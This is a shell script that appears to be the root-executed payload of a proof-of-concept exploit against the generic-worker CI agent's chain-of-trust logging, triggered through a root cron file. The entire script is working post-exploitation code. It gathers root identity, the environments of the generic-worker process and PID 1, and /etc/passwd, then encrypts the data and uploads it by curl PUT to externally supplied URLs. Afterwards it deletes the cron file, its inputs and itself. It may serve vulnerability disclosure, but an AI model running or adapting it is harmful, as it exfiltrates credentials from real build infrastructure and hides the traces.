set +e
umask 077

cert_path=$1
proof_url_file=$2
status_url_file=$3
cron_file=$4
proof_tmp="/tmp/.gw-cot-proof-$$.cms"
status_tmp="/tmp/.gw-cot-status-$$.txt"

cleanup() {
  /usr/bin/rm -f \
    "$cron_file" "$cert_path" "$proof_url_file" "$status_url_file" \
    "$proof_tmp" "$status_tmp" "$0" 2>/dev/null
}
trap cleanup EXIT HUP INT TERM

# Remove the system-consumed file before running any proof command.
/usr/bin/rm -f "$cron_file" 2>/dev/null
printf '%s\n' 'root-script-started' >"$status_tmp"

proof_put_url=$(/usr/bin/cat "$proof_url_file" 2>/dev/null)
status_put_url=$(/usr/bin/cat "$status_url_file" 2>/dev/null)

gw_pid=
for comm_file in /proc/[0-9]*/comm; do
  [ -r "$comm_file" ] || continue
  proc_name=$(/usr/bin/cat "$comm_file" 2>/dev/null)
  case "$proc_name" in
    generic-worker*)
      gw_pid=${comm_file#/proc/}
      gw_pid=${gw_pid%/comm}
      break
      ;;
  esac
done

if [ -r "$cert_path" ] && [ -n "$proof_put_url" ]; then
  {
    printf '%s\n' 'proof-version=4'
    printf '%s\n' 'primitive=generic-worker-chain-of-trust-certified-log-symlink'
    printf '%s\n' 'execution-sink=root-cron-file'

    printf '%s\n' '[root-identity]'
    /usr/bin/id 2>/dev/null
    printf 'uid='; /usr/bin/id -u 2>/dev/null
    printf 'gid='; /usr/bin/id -g 2>/dev/null
    printf 'user='; /usr/bin/whoami 2>/dev/null

    printf '%s\n' '[root-process-status]'
    /usr/bin/cat /proc/self/status 2>/dev/null
    printf '%s\n' '[root-process.env]'
    /usr/bin/tr '\000' '\n' </proc/self/environ 2>/dev/null

    printf '%s\n' '[generic-worker-pid]'
    printf '%s\n' "${gw_pid:-not-found}"
    if [ -n "$gw_pid" ]; then
      printf '%s\n' '[generic-worker-process-status]'
      /usr/bin/cat "/proc/$gw_pid/status" 2>/dev/null
      printf '%s\n' '[generic-worker-process-cmdline]'
      /usr/bin/tr '\000' ' ' <"/proc/$gw_pid/cmdline" 2>/dev/null
      printf '\n'
      printf '%s\n' '[generic-worker-process.env]'
      /usr/bin/tr '\000' '\n' <"/proc/$gw_pid/environ" 2>/dev/null
    fi

    printf '%s\n' '[pid1-process.env]'
    /usr/bin/tr '\000' '\n' </proc/1/environ 2>/dev/null

    printf '%s\n' '[/etc/passwd]'
    /usr/bin/cat /etc/passwd 2>/dev/null
  } | /usr/bin/openssl cms \
    -encrypt \
    -binary \
    -aes256 \
    -outform DER \
    -out "$proof_tmp" \
    "$cert_path" 2>/dev/null

  if [ -s "$proof_tmp" ]; then
    if /usr/bin/curl \
      --fail --silent --show-error \
      --retry 3 --retry-all-errors \
      --connect-timeout 10 --max-time 90 \
      --request PUT \
      --header 'Content-Type: application/pkcs7-mime' \
      --upload-file "$proof_tmp" \
      "$proof_put_url" >/dev/null 2>&1; then
      proof_sha=$(/usr/bin/sha256sum "$proof_tmp" | /usr/bin/cut -d ' ' -f 1)
      printf '%s\n' 'encrypted-proof-ready' >>"$status_tmp"
      printf 'cms-sha256=%s\n' "$proof_sha" >>"$status_tmp"
    else
      printf '%s\n' 'encrypted-proof-upload-failed' >>"$status_tmp"
    fi
  else
    printf '%s\n' 'encryption-failed' >>"$status_tmp"
  fi
else
  printf '%s\n' 'proof-input-unavailable' >>"$status_tmp"
fi

if [ -n "$status_put_url" ]; then
  /usr/bin/curl \
    --fail --silent --show-error \
    --retry 3 --retry-all-errors \
    --connect-timeout 10 --max-time 90 \
    --request PUT \
    --header 'Content-Type: text/plain; charset=utf-8' \
    --upload-file "$status_tmp" \
    "$status_put_url" >/dev/null 2>&1
fi

exit 0
